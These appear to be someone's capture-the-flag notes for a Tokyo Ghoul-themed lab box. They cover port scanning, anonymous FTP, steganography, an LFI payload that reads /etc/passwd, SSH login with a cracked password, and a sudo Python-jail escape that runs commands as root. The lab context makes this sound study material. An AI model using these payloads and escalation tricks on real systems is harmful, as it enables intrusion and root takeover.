nmap:
21 ftp anon allowed
22 ssh
80 http

login ftp as anonymous
get Aogiri_tree.txt
get need_to_talk: binary file
		chmod +x: 
		rabin2 -z need_to_talk: get passphrase: kamishiro
		type to need_to_talk: get passphrase for rize_and_kaneki.jpg: You_found_1t
steghide extract -sf rize_and_kaneki.jpg: 
	get yougotme.txt
		morse code -> hex -> base64 -> text : d1r3c70ry_center

gobuster /d1r3c70ry_center: /claim
lfi exploit: ?view=%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
got hashed passwd: password123

ssh kamishiro@ghoul.local
	-> get user.txt

sudo -l we can run /usr/bin/python3 /home/kamishiro/jail.py as root
a similar chalenge of escaping python jail: https://anee.me/escaping-python-jails-849c65cf306e
	sudo /usr/bin/python3 /home/kamishiro/jail.py
	__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /root/root.txt')

	-> get root.txt


 